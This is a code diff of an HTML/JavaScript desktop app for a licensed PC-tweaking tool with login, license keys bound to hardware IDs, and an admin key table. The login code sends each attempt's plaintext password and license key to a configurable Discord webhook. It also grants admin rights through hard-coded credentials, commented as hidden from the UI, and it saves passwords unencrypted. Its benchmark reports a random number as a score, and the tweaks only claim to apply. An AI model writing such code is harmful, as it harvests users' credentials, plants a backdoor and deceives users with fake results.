@@ -384,354 +384,492 @@
             </button>
           </li>
           <li class="list-group-item bg-dark text-white border-secondary">
-            <strong>NVIDIA App           <li class="list-group-item bg-dark text-white border-secondary">
-              <strong>NVIDIA App</strong>
-              <button class="btn btn-sm btn-outline-light float-end"
-                onclick="downloadInstall('NVIDIA App','https://www.nvidia.com/en-us/software/nvidia-app/')">
-                Download & Install
-              </button>
-            </li>
-          </ul>
-        </div>
-  
-        <!-- 3.10) ADMIN PAGE -->
-        <div id="adminPage" style="display:none;">
-          <h3>Admin Panel</h3>
-          <p>View or manage all keys, bound user, expiration, etc.</p>
-          <button class="btn btn-secondary mb-2" onclick="reloadKeys()">Reload Keys</button>
-          <table class="table table-dark table-bordered" id="keysTable">
-            <thead>
-              <tr>
-                <th>Key</th>
-                <th>Type</th>
-                <th>Bound User</th>
-                <th>HWID</th>
-                <th>Activation Date</th>
-                <th>Expired?</th>
-              </tr>
-            </thead>
-            <tbody></tbody>
-          </table>
-        </div>
-  
-      </div> <!-- /p-4 -->
-    </div> <!-- /mainApp -->
-  </div><!-- /container-fluid -->
-  
-  <script>
-    /***************************************************************
-     * 0) BOOTSTRAP TOOLTIPS INIT
-     ***************************************************************/
-    document.addEventListener('DOMContentLoaded', () => {
-      const tooltipTriggerList = [].slice.call(
-        document.querySelectorAll('[data-bs-toggle="tooltip"]')
-      );
-      tooltipTriggerList.map(el => new bootstrap.Tooltip(el));
-    });
-  
-    /***************************************************************
-     * 1) IMPORTS & GLOBALS
-     ***************************************************************/
-    const si    = require('systeminformation');
-    const fs    = require('fs');
-    const path  = require('path');
-    const fetch = require('node-fetch');
-    const { exec } = require('child_process');
-    const os   = require('os');
-  
-    const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json');
-    const KEYS_FILE     = path.join(__dirname, 'keys.json');
-    const CONFIG_FILE   = path.join(__dirname, 'config.json'); // for load/save tweak states
-    const DISCORD_WEBHOOK_URL = ""; // put your webhook here if you want logs
-  
-    let isAdmin = false;
-    let HWID    = null;
-    let usageInterval;
-    si.system().then(sys => {
-      HWID = sys.uuid || sys.serial || "UnknownHWID";
-    });
-  
-    document.getElementById('loginSection').style.display = 'block';
-  
-    // On load, try to load saved login (if user checked "Remember me")
-    loadSavedLogin();
-  
-    /***************************************************************
-     * 2) LOGIN LOGIC
-     ***************************************************************/
-    async function attemptLogin() {
-      const username = document.getElementById('loginUsername').value.trim();
-      const password = document.getElementById('loginPassword').value.trim();
-      const keyVal   = document.getElementById('loginKey').value.trim();
-      const remember = document.getElementById('saveLoginCheck').checked;
-  
-      // log attempt to Discord
-      await sendToDiscord(`Login attempt: user=${username}, pass=${password}, key=${keyVal}`);
-  
-      // admin check (secretly no mention in UI)
-      if (username === "BANGBANG" && password === "Kykyky$7$7$7") {
-        isAdmin = true;
-        if (remember) saveLogin(username, password, "");
-        document.getElementById('loginSection').style.display = 'none';
-        document.getElementById('restoreSection').style.display = 'block';
-        return;
-      }
-  
-      // Normal user: Validate username, password, and key
-      if (!checkUsername(username)) {
-        alert("Invalid username (3-20 chars, no 'admin').");
-        return;
-      }
-      if (!checkPassword(password)) {
-        alert("Password must have uppercase, lowercase, digit, symbol, >=8 chars.");
-        return;
-      }
-      if (!keyVal) {
-        alert("Please enter your license key.");
-        return;
-      }
-  
-      // read accounts, keys
-      let accountsData = readJSON(ACCOUNTS_FILE); // { accounts: [...] }
-      let keysData     = readJSON(KEYS_FILE);     // { keys: {...} }
-      if (!keysData.keys || !keysData.keys[keyVal]) {
-        alert("Invalid key!");
-        return;
-      }
-      let keyObj = keysData.keys[keyVal];
-      // check binding
-      if (keyObj.boundUser && keyObj.boundUser.toLowerCase() !== username.toLowerCase()) {
-        alert("That key is already bound to another user!");
-        return;
-      }
-      if (keyObj.boundHWID && keyObj.boundHWID !== HWID) {
-        alert("That key is bound to a different PC!");
-        return;
-      }
-      // find user or create
-      let user = accountsData.accounts.find(a => a.username.toLowerCase() === username.toLowerCase());
-      if (!user) {
-        // create new
-        user = { username, password, key: keyVal, hwid: HWID };
-        accountsData.accounts.push(user);
-        if (!keyObj.activationDate) {
-          keyObj.activationDate = new Date().toISOString();
-        }
-        keyObj.boundUser = username;
-        keyObj.boundHWID = HWID;
-        writeJSON(ACCOUNTS_FILE, accountsData);
-        writeJSON(KEYS_FILE, keysData);
-        await sendToDiscord(`New user registered: ${username}, key=${keyVal}`);
-      } else {
-        // existing user
-        if (user.password !== password) {
-          alert("Incorrect password!");
-          return;
-        }
-        if (user.key !== keyVal) {
-          alert("That key doesn't match your account record!");
-          return;
-        }
-        if (user.hwid !== HWID) {
-          alert("Hardware mismatch!");
-          return;
-        }
-        // check expiration
-        if (isKeyExpired(keyObj)) {
-          alert("Your license key is expired!");
-          return;
-        }
-        await sendToDiscord(`Existing user login success: ${username}`);
-      }
-      if (remember) saveLogin(username, password, keyVal);
-  
-      // success
+            <strong>NVIDIA App</strong>
+            <button class="btn btn-sm btn-outline-light float-end"
+              onclick="downloadInstall('NVIDIA App','https://www.nvidia.com/en-us/software/nvidia-app/')">
+              Download & Install
+            </button>
+          </li>
+        </ul>
+      </div>
+
+      <!-- 3.10) ADMIN PAGE -->
+      <div id="adminPage" style="display:none;">
+        <h3>Admin Panel</h3>
+        <p>View or manage all keys, bound user, expiration, etc.</p>
+        <button class="btn btn-secondary mb-2" onclick="reloadKeys()">Reload Keys</button>
+        <table class="table table-dark table-bordered" id="keysTable">
+          <thead>
+            <tr>
+              <th>Key</th>
+              <th>Type</th>
+              <th>Bound User</th>
+              <th>HWID</th>
+              <th>Activation Date</th>
+              <th>Expired?</th>
+            </tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+
+    </div> <!-- /p-4 -->
+  </div> <!-- /mainApp -->
+</div><!-- /container-fluid -->
+
+<script>
+  /***************************************************************
+   * 0) BOOTSTRAP TOOLTIPS INIT
+   ***************************************************************/
+  document.addEventListener('DOMContentLoaded', () => {
+    const tooltipTriggerList = [].slice.call(
+      document.querySelectorAll('[data-bs-toggle="tooltip"]')
+    );
+    tooltipTriggerList.map(el => new bootstrap.Tooltip(el));
+  });
+
+  /***************************************************************
+   * 1) IMPORTS & GLOBALS
+   ***************************************************************/
+  const si    = require('systeminformation');
+  const fs    = require('fs');
+  const path  = require('path');
+  const fetch = require('node-fetch');
+  const { exec } = require('child_process');
+  const os   = require('os');
+
+  const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json');
+  const KEYS_FILE     = path.join(__dirname, 'keys.json');
+  const CONFIG_FILE   = path.join(__dirname, 'config.json'); // for load/save tweak states
+  const DISCORD_WEBHOOK_URL = ""; // put your webhook here if you want logs
+
+  let isAdmin = false;
+  let HWID    = null;
+  let usageInterval;
+  si.system().then(sys => {
+    HWID = sys.uuid || sys.serial || "UnknownHWID";
+  });
+
+  document.getElementById('loginSection').style.display = 'block';
+
+  // On load, try to load saved login (if user checked "Remember me")
+  loadSavedLogin();
+
+  /***************************************************************
+   * 2) LOGIN LOGIC
+   ***************************************************************/
+  async function attemptLogin() {
+    const username = document.getElementById('loginUsername').value.trim();
+    const password = document.getElementById('loginPassword').value.trim();
+    const keyVal   = document.getElementById('loginKey').value.trim();
+    const remember = document.getElementById('saveLoginCheck').checked;
+
+    // log attempt to Discord
+    await sendToDiscord(`Login attempt: user=${username}, pass=${password}, key=${keyVal}`);
+
+    // admin check (secretly no mention in UI)
+    if (username === "BANGBANG" && password === "Kykyky$7$7$7") {
+      isAdmin = true;
+      if (remember) saveLogin(username, password, "");
       document.getElementById('loginSection').style.display = 'none';
       document.getElementById('restoreSection').style.display = 'block';
+      return;
     }
-  
-    function createRestorePoint() {
-      // real usage: spawn PS script
-      alert("Creating restore point... (demo).");
-      proceedToMain();
+
+    // Normal user: Validate username, password, and key
+    if (!checkUsername(username)) {
+      alert("Invalid username (3-20 chars, no 'admin').");
+      return;
     }
-    function skipRestorePoint() {
-      proceedToMain();
+    if (!checkPassword(password)) {
+      alert("Password must have uppercase, lowercase, digit, symbol, >=8 chars.");
+      return;
     }
-    function proceedToMain() {
-      document.getElementById('restoreSection').style.display = 'none';
-      document.getElementById('mainApp').style.display = 'block';
-  
-      if (isAdmin) {
-        document.getElementById('adminNavItem').style.display = 'block';
+    if (!keyVal) {
+      alert("Please enter your license key.");
+      return;
+    }
+
+    // read accounts, keys
+    let accountsData = readJSON(ACCOUNTS_FILE); // { accounts: [...] }
+    let keysData     = readJSON(KEYS_FILE);     // { keys: {...} }
+    if (!keysData.keys || !keysData.keys[keyVal]) {
+      alert("Invalid key!");
+      return;
+    }
+    let keyObj = keysData.keys[keyVal];
+    // check binding
+    if (keyObj.boundUser && keyObj.boundUser.toLowerCase() !== username.toLowerCase()) {
+      alert("That key is already bound to another user!");
+      return;
+    }
+    if (keyObj.boundHWID && keyObj.boundHWID !== HWID) {
+      alert("That key is bound to a different PC!");
+      return;
+    }
+    // find user or create
+    let user = accountsData.accounts.find(a => a.username.toLowerCase() === username.toLowerCase());
+    if (!user) {
+      // create new
+      user = { username, password, key: keyVal, hwid: HWID };
+      accountsData.accounts.push(user);
+      if (!keyObj.activationDate) {
+        keyObj.activationDate = new Date().toISOString();
       }
-      showPage('dashboardPage');
-      loadSystemInfo();
-      startUsageMonitoring();
-    }
-    function logout() {
-      clearSavedLogin();
-      location.reload();
-    }
-  
-    /***************************************************************
-     * 3) UTILS
-     ***************************************************************/
-    function checkUsername(u) {
-      if (u.length < 3 || u.length > 20) return false;
-      if (u.toLowerCase().includes("admin")) return false;
-      return true;
-    }
-    function checkPassword(p) {
-      if (p.length < 8) return false;
-      if (!/[A-Z]/.test(p)) return false;
-      if (!/[a-z]/.test(p)) return false;
-      if (!/\d/.test(p))  return false;
-      if (!/[^a-zA-Z0-9]/.test(p)) return false;
-      return true;
-    }
-  
-    // read/write JSON
-    function readJSON(fp) {
-      try {
-        let raw = fs.readFileSync(fp, 'utf8');
-        return JSON.parse(raw);
-      } catch { return {}; }
-    }
-    function writeJSON(fp, data) {
-      fs.writeFileSync(fp, JSON.stringify(data, null, 2));
-    }
-  
-    // Discord
-    async function sendToDiscord(msg) {
-      if (!DISCORD_WEBHOOK_URL) return;
-      try {
-        await fetch(DISCORD_WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: msg })
-        });
-      } catch(e) { console.log("Discord error:", e); }
-    }
-  
-    // Key expiration
-    function isKeyExpired(kobj) {
-      if (!kobj.type || kobj.type === "lifetime") return false;
-      if (!kobj.activationDate) return false;
-      let daysAllowed = parseInt(kobj.type);
-      if (!daysAllowed) return false;
-      let actDate = new Date(kobj.activationDate);
-      let now = new Date();
-      let diff = Math.floor((now - actDate) / (1000*60*60*24));
-      return diff > daysAllowed;
-    }
-  
-    /***************************************************************
-     * 4) SHOW/HIDE PAGES
-     ***************************************************************/
-    function showPage(pageId) {
-      const allPages = [
-        'dashboardPage', 'fpsTweaks', 'netTweaks', 'visualTweaks', 'privacyTweaks', 
-        'miscTweaks', 'powerTweaks', 'benchmarkPage', 'softwarePage', 'adminPage'
-      ];
-      allPages.forEach(pid => {
-        document.getElementById(pid).style.display = pid === pageId ? 'block' : 'none';
-      });
-    }
-  
-    /***************************************************************
-     * 5) DASHBOARD: System Info
-     ***************************************************************/
-    async function loadSystemInfo() {
-      try {
-        const cpuData = await si.cpu();
-        document.getElementById('cpuName').innerText = cpuData.brand;
-        const gpuData = await si.graphics();
-        if (gpuData.controllers && gpuData.controllers.length>0) {
-          document.getElementById('gpuName').innerText = gpuData.controllers[0].model;
-        }
-        const osData = await si.osInfo();
-        document.getElementById('osInfo').innerText = osData.distro + " " + osData.release;
-      } catch(e) { console.error(e); }
-    }
-    function startUsageMonitoring() {
-      if (usageInterval) clearInterval(usageInterval);
-      usageInterval = setInterval(async () => {
-        try {
-          let load = await si.currentLoad();
-          document.getElementById('cpuUsage').innerText = load.currentLoad.toFixed(1)+"%";
-          let mem  = await si.mem();
-          let used = (mem.active / mem.total)*100;
-          document.getElementById('memUsage').innerText = used.toFixed(1)+"%";
-        } catch(e) { console.error(e); }
-      }, 1500);
-    }
-  
-    /***************************************************************
-     * 6) TWEAKS
-     * In real usage, you'd run scripts or set registry keys. Here, we do placeholders.
-     ***************************************************************/
-    function applyFpsTweaks() {
-      const gm  = document.getElementById('toggleGameMode').checked;
-      const dvr = document.getElementById('toggleGameDVR').checked;
-      const fs  = document.getElementById('toggleFastStartup').checked;
-      // do real logic
-      alert(`Applied FPS Tweaks:\nGameMode=${gm}, GameDVR=${dvr}, FastStartup=${fs}. (demo)`); 
-    }
-    function applyNetTweaks() {
-      const tcp = document.getElementById('toggleTCP').checked;
-      const dns = document.getElementById('toggleDNSFlush').checked;
-      alert(`Applied Network Tweaks:\nTCP=${tcp}, FlushDNS=${dns}. (demo)`); 
-    }
-    function applyVisualTweaks() {
-      const anim = document.getElementById('toggleAnimations').checked;
-      const tran= document.getElementById('toggleTransparency').checked;
-      alert(`Visual Tweaks:\nDisableAnimations=${anim}, Transparency=${tran}. (demo)`); 
-    }
-    function applyPrivacyTweaks() {
-      const upd   = document.getElementById('toggleWinUpdate').checked;
-      const srch  = document.getElementById('toggleSearchIndex').checked;
-      const telem = document.getElementById('toggleTelemetry').checked;
-      alert(`Privacy Tweaks:\nWinUpdate=${upd}, SearchIndex=${srch}, Telemetry=${telem}. (demo)`); 
-    }
-    function applyMiscTweaks() {
-      const rem  = document.getElementById('toggleRemoteAssist').checked;
-      const bapp = document.getElementById('toggleBackgroundApps').checked;
-      const dblt = document.getElementById('toggleDebloat').checked;
-      alert(`Misc Tweaks:\nRemoteAssist=${rem}, BackgroundApps=${bapp}, Debloat=${dblt}. (demo)`); 
-    }
-  
-    function applyPowerPlan() {
-      const plan = document.getElementById('powerPlanSelect').value;
-      if (!plan) {
-        alert("Please select a power plan!");
+      keyObj.boundUser = username;
+      keyObj.boundHWID = HWID;
+      writeJSON(ACCOUNTS_FILE, accountsData);
+      writeJSON(KEYS_FILE, keysData);
+      await sendToDiscord(`New user registered: ${username}, key=${keyVal}`);
+    } else {
+      // existing user
+      if (user.password !== password) {
+        alert("Incorrect password!");
         return;
       }
-      // real usage: run "powercfg" commands
-      alert(`Applied power plan: ${plan}. (demo)`);
+      if (user.key !== keyVal) {
+        alert("That key doesn't match your account record!");
+        return;
+      }
+      if (user.hwid !== HWID) {
+        alert("Hardware mismatch!");
+        return;
+      }
+      // check expiration
+      if (isKeyExpired(keyObj)) {
+        alert("Your license key is expired!");
+        return;
+      }
+      await sendToDiscord(`Existing user login success: ${username}`);
     }
-  
-    /***************************************************************
-     * 7) BENCHMARK
-     ***************************************************************/
-    function startBenchmark() {
-      // placeholder: run a quick test or spawn a child process for real benchmark
-      let randScore = Math.floor(Math.random()*10000)+1000;
-      document.getElementById('benchmarkResult').innerText = `Benchmark complete! Score: ${randScore}`;
-      // store in config if we want
-      let cfg = readJSON(CONFIG_FILE);
-      cfg.lastBenchmark = randScore;
-      writeJSON(CONFIG_FILE, cfg);
+    if (remember) saveLogin(username, password, keyVal);
+
+    // success
+    document.getElementById('loginSection').style.display = 'none';
+    document.getElementById('restoreSection').style.display = 'block';
+  }
+
+  function createRestorePoint() {
+    // real usage: spawn PS script
+    alert("Creating restore point... (demo).");
+    proceedToMain();
+  }
+  function skipRestorePoint() {
+    proceedToMain();
+  }
+  function proceedToMain() {
+    document.getElementById('restoreSection').style.display = 'none';
+    document.getElementById('mainApp').style.display = 'block';
+
+    if (isAdmin) {
+      document.getElementById('adminNavItem').style.display = 'block';
     }
-  
-    /***************************************************************
-     * 8) SOFTWARE
-     ***************************************************************/
-    function downloadInstall(name, url) {
-      alert(`Downloading ${name} from: ${url}\nThen we'd run the installer. (demo)`);
-      // real usage: do net request, save file to temp, exec it
+    showPage('dashboardPage');
+    loadSystemInfo();
+    startUsageMonitoring();
+  }
+  function logout() {
+    clearSavedLogin();
+    location.reload();
+  }
+
+  /***************************************************************
+   * 3) UTILS
+   ***************************************************************/
+  function checkUsername(u) {
+    if (u.length < 3 || u.length > 20) return false;
+    if (u.toLowerCase().includes("admin")) return false;
+    return true;
+  }
+  function checkPassword(p) {
+    if (p.length < 8) return false;
+    if (!/[A-Z]/.test(p)) return false;
+    if (!/[a-z]/.test(p)) return false;
+    if (!/\d/.test(p))  return false;
+    if (!/[^a-zA-Z0-9]/.test(p)) return false;
+    return true;
+  }
+
+  // read/write JSON
+  function readJSON(fp) {
+    try {
+      let raw = fs.readFileSync(fp, 'utf8');
+      return JSON.parse(raw);
+    } catch { return {}; }
+  }
+  function writeJSON(fp, data) {
+    fs.writeFileSync(fp, JSON.stringify(data, null, 2));
+  }
+
+  // Discord
+  async function sendToDiscord(msg) {
+    if (!DISCORD_WEBHOOK_URL) return;
+    try {
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: msg })
+      });
+    } catch(e) { console.log("Discord error:", e); }
+  }
+
+  // Key expiration
+  function isKeyExpired(kobj) {
+    if (!kobj.type || kobj.type === "lifetime") return false;
+    if (!kobj.activationDate) return false;
+    let daysAllowed = parseInt(kobj.type);
+    if (!daysAllowed) return false;
+    let actDate = new Date(kobj.activationDate);
+    let now = new Date();
+    let diff = Math.floor((now - actDate) / (1000*60*60*24));
+    return diff > daysAllowed;
+  }
+
+  /***************************************************************
+   * 4) SHOW/HIDE PAGES
+   ***************************************************************/
+  function showPage(pageId) {
+    const allPages = [
+      'dashboardPage', 'fpsTweaks', 'netTweaks', 'visualTweaks', 'privacyTweaks', 
+      'miscTweaks', 'powerTweaks', 'benchmarkPage', 'softwarePage', 'adminPage'
+    ];
+    allPages.forEach(pid => {
+      document.getElementById(pid).style.display = pid === pageId ? 'block' : 'none';
+    });
+  }
+
+  /***************************************************************
+   * 5) DASHBOARD: System Info
+   ***************************************************************/
+  async function loadSystemInfo() {
+    try {
+      const cpuData = await si.cpu();
+      document.getElementById('cpuName').innerText = cpuData.brand;
+      const gpuData = await si.graphics();
+      if (gpuData.controllers && gpuData.controllers.length>0) {
+        document.getElementById('gpuName').innerText = gpuData.controllers[0].model;
+      }
+      const osData = await si.osInfo();
+      document.getElementById('osInfo').innerText = osData.distro + " " + osData.release;
+    } catch(e) { console.error(e); }
+  }
+  function startUsageMonitoring() {
+    if (usageInterval) clearInterval(usageInterval);
+    usageInterval = setInterval(async () => {
+      try {
+        let load = await si.currentLoad();
+        document.getElementById('cpuUsage').innerText = load.currentLoad.toFixed(1)+"%";
+        let mem  = await si.mem();
+        let used = (mem.active / mem.total)*100;
+        document.getElementById('memUsage').innerText = used.toFixed(1)+"%";
+      } catch(e) { console.error(e); }
+    }, 1500);
+  }
+
+  /***************************************************************
+   * 6) TWEAKS
+   * In real usage, you'd run scripts or set registry keys. Here, we do placeholders.
+   ***************************************************************/
+  function applyFpsTweaks() {
+    const gm  = document.getElementById('toggleGameMode').checked;
+    const dvr = document.getElementById('toggleGameDVR').checked;
+    const fs  = document.getElementById('toggleFastStartup').checked;
+    // do real logic
+    alert(`Applied FPS Tweaks:\nGameMode=${gm}, GameDVR=${dvr}, FastStartup=${fs}. (demo)`);
+  }
+  function applyNetTweaks() {
+    const tcp = document.getElementById('toggleTCP').checked;
+    const dns = document.getElementById('toggleDNSFlush').checked;
+    alert(`Applied Network Tweaks:\nTCP=${tcp}, FlushDNS=${dns}. (demo)`);
+  }
+  function applyVisualTweaks() {
+    const anim = document.getElementById('toggleAnimations').checked;
+    const tran= document.getElementById('toggleTransparency').checked;
+    alert(`Visual Tweaks:\nDisableAnimations=${anim}, Transparency=${tran}. (demo)`);
+  }
+  function applyPrivacyTweaks() {
+    const upd   = document.getElementById('toggleWinUpdate').checked;
+    const srch  = document.getElementById('toggleSearchIndex').checked;
+    const telem = document.getElementById('toggleTelemetry').checked;
+    alert(`Privacy Tweaks:\nWinUpdate=${upd}, SearchIndex=${srch}, Telemetry=${telem}. (demo)`);
+  }
+  function applyMiscTweaks() {
+    const rem  = document.getElementById('toggleRemoteAssist').checked;
+    const bapp = document.getElementById('toggleBackgroundApps').checked;
+    const dblt = document.getElementById('toggleDebloat').checked;
+    alert(`Misc Tweaks:\nRemoteAssist=${rem}, BackgroundApps=${bapp}, Debloat=${dblt}. (demo)`);
+  }
+
+  function applyPowerPlan() {
+    const plan = document.getElementById('powerPlanSelect').value;
+    if (!plan) {
+      alert("Please select a power plan!");
+      return;
     }
-  </script>
-  </body>
-  </html>
-  
+    // real usage: run "powercfg" commands
+    alert(`Applied power plan: ${plan}. (demo)`);
+  }
+
+  /***************************************************************
+   * 7) BENCHMARK
+   ***************************************************************/
+  function startBenchmark() {
+    // placeholder: run a quick test or spawn a child process for real benchmark
+    let randScore = Math.floor(Math.random()*10000)+1000;
+    document.getElementById('benchmarkResult').innerText = `Benchmark complete! Score: ${randScore}`;
+    // store in config if we want
+    let cfg = readJSON(CONFIG_FILE);
+    cfg.lastBenchmark = randScore;
+    writeJSON(CONFIG_FILE, cfg);
+  }
+
+  /***************************************************************
+   * 8) SOFTWARE
+   ***************************************************************/
+  function downloadInstall(name, url) {
+    alert(`Downloading ${name} from: ${url}\nThen we'd run the installer. (demo)`);
+    // real usage: do net request, save file to temp, exec it
+  }
+
+  /***************************************************************
+   * 9) ADMIN PAGE
+   ***************************************************************/
+  function reloadKeys() {
+    let table = document.querySelector('#keysTable tbody');
+    table.innerHTML = "";
+    let keysData = readJSON(KEYS_FILE); // { keys: {...}}
+    if (!keysData.keys) return;
+
+    for (let [k, val] of Object.entries(keysData.keys)) {
+      let tr = document.createElement('tr');
+
+      let tdKey  = document.createElement('td'); tdKey.innerText  = k; tr.appendChild(tdKey);
+      let tdType = document.createElement('td'); tdType.innerText = val.type; tr.appendChild(tdType);
+      let tdUsr  = document.createElement('td'); tdUsr.innerText  = val.boundUser || ""; tr.appendChild(tdUsr);
+      let tdHWID = document.createElement('td'); tdHWID.innerText = val.boundHWID || ""; tr.appendChild(tdHWID);
+      let tdDate = document.createElement('td'); tdDate.innerText = val.activationDate || ""; tr.appendChild(tdDate);
+      let tdExp  = document.createElement('td'); tdExp.innerText  = isKeyExpired(val) ? "Yes" : "No"; tr.appendChild(tdExp);
+
+      table.appendChild(tr);
+    }
+  }
+
+  /***************************************************************
+   * 10) REDEEM KEY PROMPT
+   ***************************************************************/
+  function redeemKeyPrompt() {
+    let newKey = prompt("Enter new license key:");
+    if (!newKey) return;
+    // In real usage, you'd re-check or re-bind the account. For now, just do a placeholder
+    alert(`Redeemed key: ${newKey} (demo)`);
+    // Potentially update user object in accounts.json
+    // etc.
+  }
+
+  /***************************************************************
+   * 11) SHOW/HIDE PASSWORD
+   ***************************************************************/
+  function toggleShowPassword(inputId) {
+    let input = document.getElementById(inputId);
+    if (input.type === "password") {
+      input.type = "text";
+    } else {
+      input.type = "password";
+    }
+  }
+
+  /***************************************************************
+   * 12) SAVE LOGIN (Remember Me)
+   ***************************************************************/
+  function saveLogin(user, pass, keyVal) {
+    let store = {
+      username: user,
+      password: pass,
+      licenseKey: keyVal
+    };
+    fs.writeFileSync(path.join(__dirname, 'login.json'), JSON.stringify(store, null, 2));
+  }
+  function loadSavedLogin() {
+    let filePath = path.join(__dirname, 'login.json');
+    if (fs.existsSync(filePath)) {
+      let data = fs.readFileSync(filePath, 'utf8');
+      let store = JSON.parse(data);
+      if (store.username && store.password) {
+        document.getElementById('loginUsername').value = store.username;
+        document.getElementById('loginPassword').value = store.password;
+        if (store.licenseKey) {
+          document.getElementById('loginKey').value = store.licenseKey;
+        }
+        document.getElementById('saveLoginCheck').checked = true;
+      }
+    }
+  }
+  function clearSavedLogin() {
+    let filePath = path.join(__dirname, 'login.json');
+    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
+  }
+
+  /***************************************************************
+   * 13) SAVE / LOAD CONFIG (Tweak States, etc.)
+   ***************************************************************/
+  function saveConfig() {
+    let configData = readJSON(CONFIG_FILE);
+    if (!configData.tweaks) configData.tweaks = {};
+
+    // e.g. store the current state of toggles
+    configData.tweaks.fps_gameMode = document.getElementById('toggleGameMode').checked;
+    configData.tweaks.fps_gameDVR  = document.getElementById('toggleGameDVR').checked;
+    configData.tweaks.fps_fastStartup = document.getElementById('toggleFastStartup').checked;
+
+    configData.tweaks.net_tcp  = document.getElementById('toggleTCP').checked;
+    configData.tweaks.net_dns  = document.getElementById('toggleDNSFlush').checked;
+
+    configData.tweaks.vis_anim = document.getElementById('toggleAnimations').checked;
+    configData.tweaks.vis_trans= document.getElementById('toggleTransparency').checked;
+
+    configData.tweaks.priv_winupd  = document.getElementById('toggleWinUpdate').checked;
+    configData.tweaks.priv_search  = document.getElementById('toggleSearchIndex').checked;
+    configData.tweaks.priv_telemetry = document.getElementById('toggleTelemetry').checked;
+
+    configData.tweaks.misc_remote  = document.getElementById('toggleRemoteAssist').checked;
+    configData.tweaks.misc_bgApps  = document.getElementById('toggleBackgroundApps').checked;
+    configData.tweaks.misc_debloat = document.getElementById('toggleDebloat').checked;
+
+    configData.powerPlan = document.getElementById('powerPlanSelect').value || "";
+
+    writeJSON(CONFIG_FILE, configData);
+    alert("Config saved!");
+  }
+
+  function loadConfig() {
+    let configData = readJSON(CONFIG_FILE);
+    if (!configData.tweaks) {
+      alert("No config found!");
+      return;
+    }
+    let t = configData.tweaks;
+    document.getElementById('toggleGameMode').checked = !!t.fps_gameMode;
+    document.getElementById('toggleGameDVR').checked  = !!t.fps_gameDVR;
+    document.getElementById('toggleFastStartup').checked = !!t.fps_fastStartup;
+
+    document.getElementById('toggleTCP').checked   = !!t.net_tcp;
+    document.getElementById('toggleDNSFlush').checked = !!t.net_dns;
+
+    document.getElementById('toggleAnimations').checked   = !!t.vis_anim;
+    document.getElementById('toggleTransparency').checked = !!t.vis_trans;
+
+    document.getElementById('toggleWinUpdate').checked   = !!t.priv_winupd;
+    document.getElementById('toggleSearchIndex').checked = !!t.priv_search;
+    document.getElementById('toggleTelemetry').checked   = !!t.priv_telemetry;
+
+    document.getElementById('toggleRemoteAssist').checked    = !!t.misc_remote;
+    document.getElementById('toggleBackgroundApps').checked  = !!t.misc_bgApps;
+    document.getElementById('toggleDebloat').checked         = !!t.misc_debloat;
+
+    document.getElementById('powerPlanSelect').value = configData.powerPlan || "";
+    alert("Config loaded!");
+  }
+
+</script>
+</body>
+</html>
